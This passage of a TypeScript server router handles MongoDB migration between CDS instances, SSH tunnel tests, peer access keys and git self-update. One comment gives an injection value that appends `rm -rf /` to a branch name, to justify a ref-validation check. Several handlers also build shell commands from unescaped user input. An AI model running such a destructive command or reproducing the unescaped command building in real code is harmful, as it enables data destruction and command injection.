    let stderrTail = '';
    const mirror = (prefix: string) => (d: Buffer) => {
      const s = d.toString();
      stderrTail = (stderrTail + s).slice(-2000);
      for (const line of s.split('\n')) {
        if (line) { cb.appendLog(`[${prefix}] ${line}`); cb.onProgressLine(line); }
      }
    };
    child.stderr!.on('data', mirror('restore'));
    child.stdout!.on('data', mirror('restore'));
    const done = new Promise<void>((resolve, reject) => {
      child.on('close', (code) => {
        if (code === 0) resolve();
        else reject(new Error(`mongorestore 失败 (exit ${code}): ${stderrTail.slice(-400)}`));
      });
      child.on('error', (err) => reject(new Error(`无法启动 mongorestore: ${err.message}`)));
    });
    return {
      stdin: child.stdin!,
      done,
      kill: () => { try { child.kill('SIGKILL'); } catch { /* */ } },
    };
  }

  // POST /api/data-migrations/:id/test-connection — test a MongoDB connection
  router.post('/data-migrations/test-connection', async (req, res) => {
    const { connection } = req.body as { connection: MongoConnectionConfig };
    if (!connection) { res.status(400).json({ error: '缺少 connection 参数' }); return; }

    try {
      let host = connection.host;
      let port = connection.port;

      // Resolve local
      if (connection.type === 'local') {
        const mongoInfra = stateService.getInfraServices().find(s => s.id === 'mongodb');
        if (!mongoInfra) { res.json({ success: false, error: '本机 MongoDB 未注册' }); return; }
        host = stateService.getCdsEnvVars()['CDS_HOST'] || '172.17.0.1';
        port = mongoInfra.hostPort;
      }

      // Build mongosh/mongo test command
      let testCmd = `mongosh --host ${host} --port ${port} --eval "db.adminCommand({ping:1})" --quiet`;
      if (connection.username) testCmd = `mongosh --host ${host} --port ${port} -u ${connection.username} -p ${connection.password || ''} --authenticationDatabase ${connection.authDatabase || 'admin'} --eval "db.adminCommand({ping:1})" --quiet`;

      const result = await shell.exec(testCmd, { timeout: 10000 });
      if (result.exitCode === 0) {
        // Get database list
        let listCmd = `mongosh --host ${host} --port ${port} --eval "JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>({name:d.name,sizeOnDisk:d.sizeOnDisk})))" --quiet`;
        if (connection.username) listCmd = `mongosh --host ${host} --port ${port} -u ${connection.username} -p ${connection.password || ''} --authenticationDatabase ${connection.authDatabase || 'admin'} --eval "JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>({name:d.name,sizeOnDisk:d.sizeOnDisk})))" --quiet`;

        const listResult = await shell.exec(listCmd, { timeout: 10000 });
        let databases: unknown[] = [];
        try { databases = JSON.parse(listResult.stdout.trim()); } catch { /* ok */ }
        res.json({ success: true, databases });
      } else {
        // Fallback: try basic TCP connectivity
        const tcpResult = await shell.exec(`timeout 5 bash -c "echo > /dev/tcp/${host}/${port}" 2>&1 || echo "TCP_FAILED"`);
        if (tcpResult.stdout.includes('TCP_FAILED')) {
          res.json({ success: false, error: `无法连接到 ${host}:${port}` });
        } else {
          res.json({ success: false, error: `连接成功但认证失败: ${result.stderr || result.stdout}` });
        }
      }
    } catch (e) {
      res.json({ success: false, error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/list-databases — list databases with sizes
  router.post('/data-migrations/list-databases', async (req, res) => {
    const { connection } = req.body as { connection: MongoConnectionConfig };
    if (!connection) { res.status(400).json({ error: '缺少 connection 参数' }); return; }
    try {
      const conn = resolveMongoConn(connection);
      const evalScript = `JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>({name:d.name,sizeOnDisk:d.sizeOnDisk})))`;
      const cmd = `mongosh --host ${conn.host} --port ${conn.port}${mongoAuthArgs(conn)} --eval "${evalScript}" --quiet 2>/dev/null`;
      const result = await shell.exec(cmd, { timeout: 15000 });
      let databases: Array<{ name: string; sizeOnDisk: number }> = [];
      if (result.exitCode === 0) {
        const lines = result.stdout.trim().split('\n');
        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed.startsWith('[')) { try { databases = JSON.parse(trimmed); break; } catch { /* */ } }
        }
      }
      // Filter out system databases for cleaner UX
      const userDbs = databases.filter(d => !['admin', 'config', 'local'].includes(d.name));
      const sysDbs = databases.filter(d => ['admin', 'config', 'local'].includes(d.name));
      res.json({ databases: [...userDbs, ...sysDbs] });
    } catch (e) {
      res.json({ databases: [], error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/list-collections — list collections in a database with doc counts
  router.post('/data-migrations/list-collections', async (req, res) => {
    const { connection } = req.body as { connection: MongoConnectionConfig };
    if (!connection) { res.status(400).json({ error: '缺少 connection 参数' }); return; }
    if (!connection.database) { res.status(400).json({ error: '请指定数据库名' }); return; }

    try {
      const conn = resolveMongoConn(connection);
      const db = conn.database!;
      const evalScript = `JSON.stringify(db.getSiblingDB('${db}').getCollectionInfos({type:'collection'}).map(c=>({name:c.name,count:db.getSiblingDB('${db}').getCollection(c.name).estimatedDocumentCount()})))`;
      let cmd = `mongosh --host ${conn.host} --port ${conn.port}${mongoAuthArgs(conn)} --eval "${evalScript}" --quiet 2>/dev/null`;

      const result = await shell.exec(cmd, { timeout: 15000 });
      if (result.exitCode !== 0) {
        res.json({ collections: [], error: result.stderr || 'mongosh 执行失败' });
        return;
      }
      // Parse JSON — mongosh may output extra lines, find the JSON array line
      const lines = result.stdout.trim().split('\n');
      let collections: Array<{ name: string; count: number }> = [];
      for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed.startsWith('[')) {
          try { collections = JSON.parse(trimmed); break; } catch { /* try next line */ }
        }
      }
      collections.sort((a, b) => a.name.localeCompare(b.name));
      res.json({ collections });
    } catch (e) {
      res.json({ collections: [], error: (e as Error).message });
    }
  });

  // GET /api/data-migrations/:id/log — get migration log
  router.get('/data-migrations/:id/log', (req, res) => {
    const migration = stateService.getDataMigration(req.params.id);
    if (!migration) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    res.json({ log: migration.log || '' });
  });

  // POST /api/data-migrations/test-tunnel — verify an SSH tunnel config
  // Runs `ssh user@host echo __cds_ok__` with the supplied credentials.
  router.post('/data-migrations/test-tunnel', async (req, res) => {
    const { sshTunnel } = req.body as { sshTunnel: MongoConnectionConfig['sshTunnel'] };
    if (!sshTunnel || !sshTunnel.host || !sshTunnel.username) {
      res.json({ success: false, error: '请填写 SSH 主机和用户名' });
      return;
    }
    try {
      const sshBase = buildSshBase(sshTunnel);
      // Add 'echo __cds_ok__' as the remote command and enforce a 15s timeout on client side
      const argv = [...sshBase, `echo __cds_ok__`];
      const result = await new Promise<{ code: number; stdout: string; stderr: string }>((resolve) => {
        const child = spawn('ssh', argv, { stdio: ['ignore', 'pipe', 'pipe'] });
        let stdout = ''; let stderr = '';
        const timer = setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* */ } }, 15000);
        child.stdout.on('data', (d) => { stdout += d.toString(); });
        child.stderr.on('data', (d) => { stderr += d.toString(); });
        child.on('close', (code) => { clearTimeout(timer); resolve({ code: code ?? 1, stdout, stderr }); });
        child.on('error', (err) => { clearTimeout(timer); resolve({ code: 1, stdout, stderr: err.message }); });
      });
      if (result.code === 0 && result.stdout.includes('__cds_ok__')) {
        // Optional: also check mongodump availability on the remote side
        let mongoNote = '';
        if (sshTunnel.dockerContainer) {
          mongoNote = `（通过容器 ${sshTunnel.dockerContainer}）`;
        } else {
          const toolCheck = await new Promise<{ code: number; stdout: string }>((resolve) => {
            const child = spawn('ssh', [...sshBase, 'which mongodump 2>/dev/null || echo NOT_FOUND'], { stdio: ['ignore', 'pipe', 'pipe'] });
            let stdout = '';
            const timer = setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* */ } }, 10000);
            child.stdout.on('data', (d) => { stdout += d.toString(); });
            child.on('close', (code) => { clearTimeout(timer); resolve({ code: code ?? 1, stdout }); });
            child.on('error', () => { clearTimeout(timer); resolve({ code: 1, stdout: '' }); });
          });
          if (toolCheck.stdout.includes('NOT_FOUND')) {
            mongoNote = '（⚠ 远程未找到 mongodump；建议配置 docker 容器名）';
          } else {
            mongoNote = '（远程 mongodump 可用）';
          }
        }
        res.json({ success: true, message: `SSH 连接成功 ${mongoNote}` });
      } else {
        res.json({ success: false, error: (result.stderr || 'SSH 连接失败').trim().slice(0, 400) });
      }
    } catch (e) {
      res.json({ success: false, error: (e as Error).message });
    }
  });

  // ─────────────────────────────────────────────────────────────────
  //   CDS Peer Registry (one-click cross-CDS migration)
  // ─────────────────────────────────────────────────────────────────

  // GET /api/data-migrations/my-key — return this CDS's own access key so the user can copy it.
  //
  // Response:
  //   { accessKey: string|null, baseUrl: string, label: string, hint: string }
  //
  // If no key is configured, `accessKey` is null and the caller can show a
  // "set AI_ACCESS_KEY first" banner.
  router.get('/data-migrations/my-key', (req, res) => {
    const accessKey = getLocalAccessKey();
    const baseUrl = guessLocalBaseUrl(req);
    const label = `${baseUrl}`;
    res.json({
      accessKey,
      baseUrl,
      label,
      hint: accessKey
        ? '复制下面的 baseUrl + 访问密钥，在另一台 CDS 的「CDS 密钥管理」中添加即可双向迁移。'
        : '当前 CDS 未设置 AI_ACCESS_KEY，请先在「设置 → 环境变量」中配置 AI_ACCESS_KEY 后再试。',
    });
  });

  // GET /api/data-migrations/peers — list registered peers (access keys are returned masked)
  router.get('/data-migrations/peers', (_req, res) => {
    const peers = stateService.getCdsPeers().map(p => ({
      ...p,
      // Mask the key — show only last 6 chars so the user can recognize it without leaking it in HTTP logs
      accessKey: p.accessKey ? `••••${p.accessKey.slice(-6)}` : '',
    }));
    res.json(peers);
  });

  // POST /api/data-migrations/peers — add a new peer. Auto-verifies by calling the peer's /my-key.
  router.post('/data-migrations/peers', async (req, res) => {
    const { name, baseUrl, accessKey } = req.body as { name?: string; baseUrl?: string; accessKey?: string };
    if (!name || !baseUrl || !accessKey) {
      res.status(400).json({ error: '缺少必填字段: name, baseUrl, accessKey' });
      return;
    }
    try { new URL(baseUrl); } catch { res.status(400).json({ error: 'baseUrl 格式错误' }); return; }
    const peer: CdsPeer = {
      id: `peer-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`,
      name,
      baseUrl: baseUrl.replace(/\/$/, ''),
      accessKey,
      createdAt: new Date().toISOString(),
    };
    // Verify — call /my-key to confirm the access key works
    try {
      const probe = await peerRequestJson<{ baseUrl: string; accessKey: string | null }>(peer, '/api/data-migrations/my-key', 'GET');
      peer.lastVerifiedAt = new Date().toISOString();
      peer.remoteLabel = probe.baseUrl || baseUrl;
    } catch (e) {
      res.status(400).json({ error: `验证失败: ${(e as Error).message}` });
      return;
    }
    stateService.addCdsPeer(peer);
    stateService.save();
    // Return masked version
    res.json({ ...peer, accessKey: `••••${accessKey.slice(-6)}` });
  });

  // PUT /api/data-migrations/peers/:id — update peer (name / baseUrl / accessKey)
  router.put('/data-migrations/peers/:id', async (req, res) => {
    const { id } = req.params;
    const existing = stateService.getCdsPeer(id);
    if (!existing) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    const { name, baseUrl, accessKey } = req.body as { name?: string; baseUrl?: string; accessKey?: string };
    const updates: Partial<CdsPeer> = {};
    if (name !== undefined) updates.name = name;
    if (baseUrl !== undefined) updates.baseUrl = baseUrl.replace(/\/$/, '');
    // Only update accessKey if caller provided a value that doesn't look masked (••••)
    if (accessKey !== undefined && !accessKey.startsWith('•')) updates.accessKey = accessKey;
    stateService.updateCdsPeer(id, updates);
    stateService.save();
    const updated = stateService.getCdsPeer(id)!;
    res.json({ ...updated, accessKey: `••••${updated.accessKey.slice(-6)}` });
  });

  // DELETE /api/data-migrations/peers/:id
  router.delete('/data-migrations/peers/:id', (req, res) => {
    const { id } = req.params;
    if (!stateService.getCdsPeer(id)) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    stateService.removeCdsPeer(id);
    stateService.save();
    res.json({ message: '已删除' });
  });

  // POST /api/data-migrations/peers/:id/test — verify a peer's connectivity
  router.post('/data-migrations/peers/:id/test', async (req, res) => {
    const peer = stateService.getCdsPeer(req.params.id);
    if (!peer) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    try {
      const probe = await peerRequestJson<{ baseUrl: string; accessKey: string | null }>(peer, '/api/data-migrations/my-key', 'GET');
      stateService.updateCdsPeer(peer.id, { lastVerifiedAt: new Date().toISOString(), remoteLabel: probe.baseUrl });
      stateService.save();
      res.json({ success: true, remoteLabel: probe.baseUrl, verifiedAt: new Date().toISOString() });
    } catch (e) {
      res.json({ success: false, error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/peers/:id/list-databases — proxy to peer's list-databases for its local infra MongoDB
  router.post('/data-migrations/peers/:id/list-databases', async (req, res) => {
    const peer = stateService.getCdsPeer(req.params.id);
    if (!peer) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    try {
      const result = await peerRequestJson<{ databases: Array<{ name: string; sizeOnDisk: number }>; error?: string }>(
        peer,
        '/api/data-migrations/list-databases',
        'POST',
        { connection: { type: 'local', host: '', port: 0 } },
      );
      res.json(result);
    } catch (e) {
      res.json({ databases: [], error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/peers/:id/list-collections — proxy list-collections for a database on the peer
  router.post('/data-migrations/peers/:id/list-collections', async (req, res) => {
    const peer = stateService.getCdsPeer(req.params.id);
    if (!peer) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    const { database } = req.body as { database?: string };
    if (!database) { res.status(400).json({ error: '请指定 database' }); return; }
    try {
      const result = await peerRequestJson<{ collections: Array<{ name: string; count: number }>; error?: string }>(
        peer,
        '/api/data-migrations/list-collections',
        'POST',
        { connection: { type: 'local', host: '', port: 0, database } },
      );
      res.json(result);
    } catch (e) {
      res.json({ collections: [], error: (e as Error).message });
    }
  });

  // ─────────────────────────────────────────────────────────────────
  //   Streaming endpoints called by remote peers (auth-protected)
  // ─────────────────────────────────────────────────────────────────

  // POST /api/data-migrations/local-dump — streams mongodump bytes for this
  // CDS's local infra MongoDB. Authorized via the standard CDS middleware
  // (cds cookie / X-AI-Access-Key). Used by remote peers to pull data.
  //
  // Body: { database?: string, collections?: string[] }
  router.post('/data-migrations/local-dump', async (req, res) => {
    const body = (req.body || {}) as { database?: string; collections?: string[] };
    let eff: MongoConnectionConfig;
    try {
      eff = resolveMongoConn({ type: 'local', host: '', port: 0, database: body.database });
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
      return;
    }
    const dumpArgs = buildMongodumpArgs(
      eff.host, eff.port,
      {},
      body.database,
      body.collections,
    );
    res.writeHead(200, {
      'Content-Type': 'application/octet-stream',
      'Cache-Control': 'no-cache',
      'X-Accel-Buffering': 'no',
    });
    const child = spawn('mongodump', dumpArgs, { stdio: ['ignore', 'pipe', 'pipe'] });
    let stderrTail = '';
    child.stderr.on('data', (d) => { stderrTail = (stderrTail + d.toString()).slice(-2000); });
    child.stdout.pipe(res);
    child.on('close', (code) => {
      if (code !== 0) {
        // We may already have sent headers — append a trailer-like marker
        try { res.write(`\n__CDS_DUMP_ERROR__:${stderrTail.slice(-400)}`); } catch { /* */ }
      }
      try { res.end(); } catch { /* */ }
    });
    child.on('error', (err) => {
      try {
        if (!res.headersSent) res.status(500).json({ error: err.message });
        else res.end();
      } catch { /* */ }
    });
    // If the client aborts the download, kill the dump.
    // IMPORTANT: use res.on('close'), NOT req.on('close'). In Node.js 18+,
    // req.on('close') fires as soon as express.json() finishes reading the
    // request body (before the handler even writes output), which would
    // kill mongodump immediately and return an empty 0-byte response.
    res.on('close', () => {
      if (!res.writableEnded) { try { child.kill('SIGKILL'); } catch { /* */ } }
    });
  });

  // POST /api/data-migrations/local-restore — pipes request body into
  // mongorestore against this CDS's local infra MongoDB.
  //
  // Query params: sourceDb, targetDb, collections (comma-separated)
  router.post('/data-migrations/local-restore', async (req, res) => {
    const sourceDb = (req.query.sourceDb as string | undefined) || undefined;
    const targetDb = (req.query.targetDb as string | undefined) || undefined;
    const colsParam = req.query.collections as string | undefined;
    const collections = colsParam ? colsParam.split(',').filter(Boolean) : undefined;

    let eff: MongoConnectionConfig;
    try {
      eff = resolveMongoConn({ type: 'local', host: '', port: 0, database: targetDb });
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
      return;
    }
    const restoreArgs = buildMongorestoreArgs(
      eff.host, eff.port,
      {},
      { drop: true, sourceDb, targetDb, collections },
    );
    const child = spawn('mongorestore', restoreArgs, { stdio: ['pipe', 'pipe', 'pipe'] });
    let stderrTail = '';
    const logLines: string[] = [];
    const mirror = (d: Buffer) => {
      const s = d.toString();
      stderrTail = (stderrTail + s).slice(-4000);
      for (const line of s.split('\n')) if (line) logLines.push(line);
    };
    child.stderr.on('data', mirror);
    child.stdout.on('data', mirror);

    // Pipe request body into mongorestore stdin
    req.pipe(child.stdin);

    // If the client aborts upload, kill the restore process
    req.on('error', () => { try { child.kill('SIGKILL'); } catch { /* */ } });
    req.on('close', () => {
      // End of request body — close stdin so mongorestore can finish
      try { child.stdin.end(); } catch { /* */ }
    });

    child.on('close', (code) => {
      if (code === 0) {
        res.json({ success: true, log: logLines.join('\n') });
      } else {
        res.status(500).json({ success: false, error: stderrTail.slice(-400) || `mongorestore exited ${code}`, log: logLines.join('\n') });
      }
    });
    child.on('error', (err) => {
      if (!res.headersSent) res.status(500).json({ success: false, error: err.message });
    });
  });

  // GET /api/self-branches — list git branches of the CDS repo itself
  //
  // 2026-05-04 增强:返回每个分支的 committer date + commit hash + 是否
  // 改动了 cds/ 目录,前端 combobox 按时间倒排显示 + 标识"动了 CDS"。
  // 旧字段 `branches: string[]` 保留向后兼容。
  router.get('/self-branches', async (_req, res) => {
    try {
      // Get current branch
      const currentResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: config.repoRoot });
      const currentBranch = currentResult.stdout.trim();

      // Fetch latest (ignore errors if offline)
      await shell.exec('git fetch --all --prune', { cwd: config.repoRoot }).catch(() => {});

      // 一次性拉所有 remote branch 的 metadata(refname + committerdate + commit hash)。
      // for-each-ref 比 git branch -v 更稳定可解析,而且能直接 sort -committerdate。
      // 用 ASCII Unit Separator(0x1F)分字段,避免分支名 / subject 里有空格干扰。
      //
      // Bugbot 第八轮 HIGH fix(2026-05-04):git for-each-ref 的 --format 语法
      // 用 `%xx` 输出 16 进制字节(`%1f` = 0x1F);**不**支持 `\xXX` 转义。
      // 上一版写 `'\\x1f'` JS 字面量是 4 个 ASCII 字符 `\x1f`,git 当 literal
      // 输出 → JS split('\x1f') 永远找不到 0x1F 字节 → parts.length < 4 全跳过
      // → 整个 branch list 返回空数组,self-update picker 完全 broken。
      // 改为:format 用 `%1f`(git 输出 0x1F 字节)+ JS split 用 '\x1f'(真 0x1F)。
      const SEP = '\x1f'; // JS 字面量 → 1 个真 0x1F 字节,用于 split
      const refResult = await shell.exec(
        `git for-each-ref --sort=-committerdate ` +
        `--format='%(refname:short)%1f%(committerdate:iso8601-strict)%1f%(objectname:short)%1f%(subject)' ` +
        `refs/remotes/origin/`,
        { cwd: config.repoRoot, timeout: 30_000 },
      );

      interface BranchMeta {
        name: string;
        committerDate: string;
        commitHash: string;
        subject: string;
        cdsTouched: boolean;  // 与当前 HEAD 比较时,是否动了 cds/ 目录
      }
      const branches: BranchMeta[] = [];
      const seen = new Set<string>();
      for (const line of refResult.stdout.split('\n')) {
        if (!line.trim()) continue;
        // \x1f 在 shell echo 里要转义,用 String.fromCharCode 还原对比
        const parts = line.split('\x1f');
        if (parts.length < 4) continue;
        let name = parts[0].trim();
        if (name.startsWith('origin/')) name = name.slice('origin/'.length);
        if (name === 'HEAD' || name.includes('HEAD ->')) continue;
        if (seen.has(name)) continue;
        seen.add(name);
        branches.push({
          name,
          committerDate: parts[1].trim(),
          commitHash: parts[2].trim(),
          subject: parts[3].trim(),
          cdsTouched: false,  // 下面批量算
        });
      }

      // cdsTouched 计算:对每个分支检查 origin/<current>..origin/<branch>
      // 是否含 cds/ 路径改动。只对 top 30 个分支做(避免慢),其它默认 false。
      // 当前分支自己 cdsTouched=false(对自己无意义)。
      const top = branches.slice(0, 30);
      await Promise.all(
        top.map(async (b) => {
          if (b.name === currentBranch) return;
          try {
            const diff = await shell.exec(
              `git log --format=%H -n 1 origin/${currentBranch}..origin/${b.name} -- cds/`,
              { cwd: config.repoRoot, timeout: 5_000 },
            );
            b.cdsTouched = diff.stdout.trim().length > 0;
          } catch {
            // 分支已删 / ref 不存在 / 其他 git 错误 — 默认 false 不阻塞
          }
        }),
      );

      // 当前分支 commit hash + 时间(给 UI 顶部显示)。
      // Bugbot 第九轮 fix(2026-05-04):合并成单 try block 内联调用,
      // 去掉中间变量避免任何缩进歧义。两个 git 命令任一失败都 catch
      // 兜底空字符串,响应不会因此 5xx。
      let commitHash = '';
      let currentCommitterDate = '';
      try {
        commitHash = (await shell.exec('git rev-parse --short HEAD', { cwd: config.repoRoot })).stdout.trim();
        currentCommitterDate = (await shell.exec('git log -1 --format=%cI HEAD', { cwd: config.repoRoot })).stdout.trim();
      } catch { /* ignore */ }

      res.json({
        current: currentBranch,
        commitHash,
        currentCommitterDate,
        // 新字段:每个分支带 metadata,按 committerDate 倒序
        branchDetails: branches,
        // 旧字段:仅 string[],按 committerDate 倒序(向后兼容老前端)
        branches: branches.map((b) => b.name),
      });
    } catch (e) {
      res.status(500).json({ error: '获取分支列表失败: ' + (e as Error).message });
    }
  });

  // GET /api/self-status — CDS 自身的更新状态全景
  //
  // 2026-05-04(用户反馈"我不清楚是否有自动更新, 这里需要显示"):
  // 「CDS 系统设置 → 维护」面板原本只能看「当前分支 + commit」,不知道
  //   - GitHub 上当前分支有没有比本地新的 commit(我该不该手动跑 self-update?)
  //   - 上次系统更新发生在什么时候,谁触发的,成功还是失败
  //
  // 这个端点把这两件事一次性返回。前端拿到后渲染两个 chip(remote-ahead /
  // last update)+ 一个历史抽屉,无需多次轮询。
  //
  // 注意:`git fetch` 会真的发网络请求,带 10s 超时;远端不可达时优雅降级
  // 到 cached(用 `--cached` 不会触发 fetch)。
  router.get('/self-status', async (_req, res) => {
    // 2026-05-04 v2(用户反馈"GET /api/self-status → 400"):
    // 之前是单一 outer try/catch + 多个 await 串联,任何一个 git 命令失败 / 上游
    // 中间件意外都会导致整个端点挂掉(返 500/4xx)。改为**逐个 try/catch + 永远返 200**,
    // 哪怕所有 git 命令全失败,也返结构完整的 JSON(各字段填默认/空值)+ 一个
    // `degraded: { reason }` 字段告诉前端 "数据有缺,但接口活着"。
    //
    // 这样即使 CDS host 上 git 抽风、网络断、ref 损坏,UI 也不会显示
    // "读取自更新状态失败" 红色 banner,而是显示能读到的部分 + 安全降级。
    const repoRoot = config.repoRoot;
    const degradedReasons: string[] = [];

    // 工具:跑一条 shell 命令,任何异常 / 非零退出都吞掉返 fallback。
    const safeExec = async (
      cmd: string,
      opts: { cwd: string; timeout?: number } = { cwd: repoRoot },
      fallback = '',
    ): Promise<string> => {
      try {
        const r = await shell.exec(cmd, opts);
        if (r.exitCode !== 0) {
          degradedReasons.push(`${cmd.slice(0, 40)}... exit=${r.exitCode}`);
          return fallback;
        }
        return r.stdout.trim();
      } catch (err) {
        degradedReasons.push(`${cmd.slice(0, 40)}... ${(err as Error).message}`);
        return fallback;
      }
    };

    // 1. 当前分支 + HEAD short SHA + 最近 commit 时间
    const currentBranch = await safeExec('git rev-parse --abbrev-ref HEAD');
    const headSha = await safeExec('git rev-parse --short HEAD');
    const headIso = await safeExec('git log -1 --format=%cI HEAD');

    // 2. fetch 当前分支(允许失败 — 远端可能不可达 / 凭据过期)
    let fetchOk = true;
    let fetchError = '';
    if (currentBranch) {
      try {
        const fetchResult = await shell.exec(
          `git fetch origin ${currentBranch}`,
          { cwd: repoRoot, timeout: 10_000 },
        );
        if (fetchResult.exitCode !== 0) {
          fetchOk = false;
          fetchError = (fetchResult.stderr || fetchResult.stdout || '').trim().slice(0, 500);
        }
      } catch (err) {
        fetchOk = false;
        fetchError = (err as Error).message;
      }
    } else {
      fetchOk = false;
      fetchError = 'currentBranch unknown — skipped fetch';
    }

    // 3. ahead/behind 对比
    let remoteAheadCount = 0;
    let localAheadCount = 0;
    let remoteAheadSubjects: Array<{ sha: string; subject: string; date: string }> = [];
    if (currentBranch) {
      const counts = await safeExec(
        `git rev-list --left-right --count HEAD...origin/${currentBranch}`,
        { cwd: repoRoot, timeout: 5_000 },
      );
      if (counts) {
        const parts = counts.split(/\s+/);
        localAheadCount = parseInt(parts[0] || '0', 10) || 0;
        remoteAheadCount = parseInt(parts[1] || '0', 10) || 0;
      }
      if (remoteAheadCount > 0) {
        const log = await safeExec(
          `git log --format='%h%x1f%cI%x1f%s' -n 5 HEAD..origin/${currentBranch}`,
          { cwd: repoRoot, timeout: 5_000 },
        );
        if (log) {
          for (const line of log.split('\n')) {
            if (!line.trim()) continue;
            const [sha, date, subject] = line.split('\x1f');
            if (sha && subject) {
              remoteAheadSubjects.push({
                sha: sha.trim(),
                date: (date || '').trim(),
                subject: subject.trim(),
              });
            }
          }
        }
      }
    }

    // 4. 自更新历史(从 state — 不可能失败,直接读)
    let history: ReturnType<typeof stateService.getSelfUpdateHistory> = [];
    try {
      history = stateService.getSelfUpdateHistory(20);
    } catch (err) {
      degradedReasons.push(`getSelfUpdateHistory: ${(err as Error).message}`);
    }

    // 5. 前端 bundle SHA(2026-05-04 fix — 用户反馈"已更新但页面不对")
    //
    // exec_cds.sh 的 build_web 在成功后会写 cds/web/dist/.build-sha = git HEAD。
    // 如果 build_web 静默失败,这个文件是旧的。前端可以对比 headSha vs webBuildSha
    // 显示 "前端比后端旧" 警告,提示用户检查 ./exec_cds.sh logs。
    let webBuildSha = '';
    let webBuildError = ''; // build_web 失败时 exec_cds.sh 会写 .build-error 标记
    try {
      const shaFile = path.resolve(repoRoot, 'cds', 'web', 'dist', '.build-sha');
      if (fs.existsSync(shaFile)) {
        webBuildSha = fs.readFileSync(shaFile, 'utf8').trim().slice(0, 40);
      }
      const errFile = path.resolve(repoRoot, 'cds', 'web', 'dist', '.build-error');
      if (fs.existsSync(errFile)) {
        webBuildError = fs.readFileSync(errFile, 'utf8').trim().slice(0, 2000);
      }
    } catch (err) {
      degradedReasons.push(`webBuildSha: ${(err as Error).message}`);
    }

    res.json({
      currentBranch,
      headSha,
      headIso,
      fetchOk,
      fetchError,
      remoteAheadCount,
      localAheadCount,
      remoteAheadSubjects,
      lastSelfUpdate: history[0] || null,
      selfUpdateHistory: history,
      // 前端 bundle 的 git HEAD,用于 detect 后端/前端 SHA 不一致(build_web 静默失败)
      webBuildSha,
      // build_web 失败标记内容(exec_cds.sh 写的 .build-error 文件,前端可展示)
      webBuildError,
      // bundle 不一致 OR build 报错时前端显示 "前端比后端旧" 警告。
      // Bugbot PR #524 反馈:轻量版(server.ts)同时检 webBuildError,这里要保持一致,
      // 否则 GlobalUpdateBadge 切到 ?probe=remote 后 build 失败时角标不会亮。
      bundleStale: Boolean(
        (headSha && webBuildSha && !webBuildSha.startsWith(headSha)) || webBuildError,
      ),
      // 给前端一个明确信号:数据是不是降级了 + 哪步降级。
      degraded: degradedReasons.length > 0 ? { reasons: degradedReasons } : null,
    });
  });

  // POST /api/self-update — switch branch + pull + restart CDS (SSE progress)
  router.post('/self-update', async (req, res) => {
    const { branch } = req.body as { branch?: string };

    initSSE(res);
    const send = (step: string, status: string, title: string) => {
      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString() });
    };

    // 2026-05-04 流水记录:从开头捕获 fromSha + start time,所有 abort 路径
    // 在 sendSSE('error',...) 后 recordSelfUpdate({status:'failed', ...}),
    // success 路径在「即将 process.exit」前 record({status:'success',...}).
    // 失败也写进流水,这样运维 lookup「上次失败是为啥」直接看历史。
    const startedAt = Date.now();
    const startedIso = new Date(startedAt).toISOString();
    const actor = (req as { username?: string }).username || 'unknown';
    let fromSha = '';
    try {
      fromSha = (await shell.exec('git rev-parse --short HEAD', { cwd: config.repoRoot }))
        .stdout.trim();
    } catch { /* tolerated — 极少数情况下 fromSha=''仍可继续 */ }
    const recordFailure = (errMsg: string): void => {
      stateService.recordSelfUpdate({
        ts: new Date().toISOString(),
        branch: branch || '',
        fromSha,
        toSha: fromSha,                    // failed → no shift
        trigger: 'manual',
        status: 'failed',
        durationMs: Date.now() - startedAt,
        error: errMsg.slice(0, 300),
        actor,
      });
    };

    try {
      const repoRoot = config.repoRoot;

      // Step 1: fetch latest
      send('fetch', 'running', '正在拉取远程更新...');
      await shell.exec('git fetch --all --prune', { cwd: repoRoot });
      send('fetch', 'done', '远程更新已拉取');

      // Step 2: switch branch if specified
      if (branch) {
        // Defense-in-depth: even though /api/self-update sits behind
        // cookie/AI-key auth, an authenticated user supplying
        // `branch='main; rm -rf /'` would otherwise run arbitrary
        // commands. Reject shell-unsafe refs before they reach
        // `shell.exec()`.
        if (!isSafeGitRef(branch)) {
          send('checkout', 'error', `拒绝不安全分支名: ${branch.slice(0, 80)}`);
          sendSSE(res, 'error', { message: `不合法的分支名: ${branch}` });
          res.end();
          recordFailure(`不合法的分支名: ${branch}`);
          return;
        }
        send('checkout', 'running', `正在切换到分支 ${branch}...`);
        // Use -f to discard tracked-file changes (safe: untracked files like .cds/state.json are untouched)
        const checkoutResult = await shell.exec(`git checkout -f ${branch}`, { cwd: repoRoot });
        if (checkoutResult.exitCode !== 0) {
          // Try creating tracking branch from remote
          const fallbackResult = await shell.exec(`git checkout -f -b ${branch} origin/${branch}`, { cwd: repoRoot });
          if (fallbackResult.exitCode !== 0) {
            const errMsg = (fallbackResult.stderr || fallbackResult.stdout || '未知错误').trim();
            send('checkout', 'error', `切换分支失败: ${errMsg}`);
            sendSSE(res, 'error', { message: `无法切换到 ${branch}: ${errMsg}` });
            res.end();
            recordFailure(`切换分支失败: ${errMsg}`);
            return;
          }
        }
        // Verify the checkout actually worked
        const verifyResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
        const actualBranch = verifyResult.stdout.trim();
        if (actualBranch !== branch) {
